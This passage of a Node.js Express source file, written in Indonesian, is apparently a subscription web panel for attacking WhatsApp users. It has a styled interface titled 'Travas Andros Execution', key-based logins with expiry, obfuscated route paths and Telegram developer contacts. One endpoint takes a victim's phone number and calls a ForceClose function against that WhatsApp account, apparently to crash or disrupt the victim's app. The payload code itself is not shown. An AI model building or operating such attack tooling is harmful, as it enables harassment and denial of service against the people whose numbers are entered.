        background: rgba(30, 30, 40, 0.95);
        border-radius: 12px;
        padding: 12px 16px;
        font-size: 13px;
        color: #ccc;
        text-align: left;
        box-shadow: 0 0 10px rgba(138, 43, 226, 0.2);
      }
      .support-box a {
        display: block;
        color: #a78bfa;
        text-decoration: none;
        margin-bottom: 6px;
        font-weight: 500;
      }
      h2 {
        text-align: center;
        margin-bottom: 18px;
        color: #c084fc;
        font-size: 20px;
        font-weight: 600;
      }
      input[type="text"] {
        width: 100%;
        padding: 14px;
        border-radius: 10px;
        border: none;
        background: #2e2e3e;
        color: white;
        font-size: 15px;
        margin-bottom: 18px;
        font-weight: 500;
      }
      button {
        width: 100%;
        padding: 14px;
        font-size: 15px;
        background: #7c3aed;
        color: white;
        font-weight: 600;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        transition: background 0.3s ease;
      }
      button:hover {
        background: #6d28d9;
      }
      .info {
        margin-top: 20px;
        font-size: 13px;
        line-height: 1.6;
        text-align: center;
        color: #ccc;
      }
      .info strong {
        color: #faccff;
      }
      .footer {
        text-align: center;
        font-size: 11px;
        margin-top: 25px;
        color: #999;
      }
    </style>
  </head>
  <body>
    ${username ? `<div class="user-info">👤 ${username} | ⏳ <span id="countdown">${formattedTime}</span></div>` : ""}
    ${username ? `<a class="logout-btn" href="/logout">Logout</a>` : ""}
    <div class="card">
      <div class="support-toggle" onclick="toggleSupport()">Support</div>
      <div class="support-box" id="supportBox">
        <a href="https://t.me/RenXiter" target="_blank">👤 Developer: @RenXiter</a>
        <a href="https://t.me/RenIsDev" target="_blank">📢 Channel: @RenIsDev</a>
      </div>

      <h2>🧬 Travas Andros Execution</h2>
      ${isForm ? `
      <form method="GET" action="/8fA3X9dTzQ1vL6eKjYpC7MnRwZb45UhEnGtVs02LBmHd">
        <input type="text" name="target" placeholder="Masukkan nomor target (62xxxx)" required />
        <button type="submit">𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧</button>
      </form>
      ` : ""}
      <div class="info">
        <p><strong>Status:</strong> ${status}</p>
        ${detail.target ? `<p><strong>Target:</strong> ${detail.target}</p>` : ""}
        ${detail.message ? `<p><strong>Info:</strong> ${detail.message}</p>` : ""}
        ${detail.timestamp ? `<p><strong>Waktu:</strong> ${detail.timestamp}</p>` : ""}
      </div>
      <div class="footer">© 2025 Hasclaw Network</div>
    </div>

    <script>
      function toggleSupport() {
        const box = document.getElementById('supportBox');
        box.style.display = box.style.display === 'block' ? 'none' : 'block';
      }

      // Countdown updater
      const countdownEl = document.getElementById("countdown");
      if (countdownEl) {
        let [min, sec] = countdownEl.textContent.split("m");
        let total = parseInt(min.trim()) * 60 + parseInt(sec.trim().replace("s", ""));

        setInterval(() => {
          if (total <= 0) return location.reload();
          total--;
          const m = Math.floor(total / 60);
          const s = total % 60;
          countdownEl.textContent = m + "m " + s + "s";
        }, 1000);
      }
    </script>
  </body>
  </html>
  `;
};


app.use(bodyParser.urlencoded({ extended: true }));


app.get("/HPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRSt14385488527Zp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRSt", (req, res) => {
  res.send(renderLoginPage());
});

app.get("/", (req, res) => {
  res.redirect("/Zp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStZp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUBHPlBp0Hm2oowHNaEHQfQHxYfySWhlRStHPlBp0Hm2oowHNaEHQfQHxYfySWhlRSt");
});

app.post("/Zp7Lk93QwXyTnR8aMfJ5CgD4bUEo1VsHBLKm20vNzAixX2eNj7PaRYqUbMzVKg4CoT10WnLZxOtHB35ld9AsmcWc1gATxvQMp37uFLNbYzEJWlnR0KhX9dokCS25oVfUB", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const index = users.findIndex(user => user.username === username && user.key === key);
  if (index === -1) {
    return res.send(renderLoginPage("Username atau Key salah"));
  }

  userApiBug = username;
  res.redirect("/8fA3X9dTzQ1vL6eKjYpC7MnRwZb45UhEnGtVs02LBmHd");
});



app.get("/8fA3X9dTzQ1vL6eKjYpC7MnRwZb45UhEnGtVs02LBmHd", (req, res) => {
  if (!userApiBug) {
    return res.send(renderLoginPage("Login akun anda"));
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === userApiBug);

  if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
    return res.send(renderLoginPage("Session kamu sudah habis. Silakan login ulang."));
  }

  const targetNumber = req.query.target;
  const target = targetNumber ? `${targetNumber}@s.whatsapp.net` : null;

  if (sessions.size === 0) {
    return res.send(renderPage("MAINTENANCE SERVER !!", { message: "Tunggu sampai maintenance selesai.." }));
  }

  if (!targetNumber) {
    return res.send(renderPage("Server ON", {
      message: "Masukkan nomor target atau pakai ?target=62xxxx"
    }, true, {
      username: currentUser.username,
      expired: currentUser.expired
    }));
  }

  try {
    ForceClose(24, target);
    res.send(renderPage("S U C C E S !!", {
      target: targetNumber,
      timestamp: new Date().toLocaleString(),
      message: "𝐇𝐚𝐬𝐜𝐥𝐚𝐰 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐓𝐚𝐫𝐠𝐞𝐭"
    }, false, {
      username: currentUser.username,
      expired: currentUser.expired
    }));
    console.log(chalk.green(`🍷 Hasclaw Execution ${target}`));
  } catch (err) {
    res.send(renderPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan"
    }, false, {
      username: currentUser.username,
      expired: currentUser.expired
    }));
  }
});



app.get("/logout", (req, res) => {
  userApiBug = null;
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});